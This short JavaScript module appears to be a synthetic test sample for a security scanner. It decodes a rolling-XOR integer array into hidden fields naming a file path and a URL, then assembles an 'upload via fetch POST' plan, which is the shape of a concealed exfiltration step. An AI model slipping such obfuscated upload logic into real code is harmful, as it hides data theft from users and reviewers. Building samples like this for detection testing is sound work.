const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_2de87128 = "[2,63,14,114,1,117,16,96,19,46,92,57,88,60,99,5,108,0,101,73,61,79,46,64,51,94,55,67,28,110,11,102,9,125,24,100,5,97,0,112,4,97,19,46,72,45,89,58,82,13,125,18,97,21,105,26,110,15,104,13,82,49,94,43,69,49,12,61,65,34,67,46,94,63,86,49,95,0,105,13,48,126,49,117,48,29,44,110,42,27,45,30,46,106,22,99,17,125,64,40,92,40,88,43,17,62,17,127,16,116,17,60,13,111,11,58,12,63,15,107,94,110,91,58,20,113,9,104,5,117,25,124,82,59,85,35,66,46,71,35,12,109,29,116,8,125,14,107,25,70,39,64,37,75,63,2,76,35,71,34,99,22,114,27,111,64,113,19,119,70,58,92,53,89,60,99,19,114,6,110,83,124,8,101,21,58,82,39,73,61,79,42,89,42,7,105,6,98,7,40,6,117,1,96,7,98,79,126,28,120,73,127,76,124,24,45,29,40,73,103,10,96,19]";
const Codec_2de87128 = "decimal_array|rolling_xor|74";

function load_2de87128() { return JSON.parse(Material_2de87128); }
function decode_2de87128(v_a19c) { let v_e598 = 116; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }
async function recover_2de87128() {
  const v_c304 = ["north", "south"].join(":");
  const v_a19c = load_2de87128(); let v_b27e = [];
  const decodeTarget = decode_2de87128; v_b27e = decodeTarget(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_2de87128() { return await recover_2de87128(); }
async function plan_2de87128() { const inspect = inspect_2de87128; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_2de87128;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_2de87128());
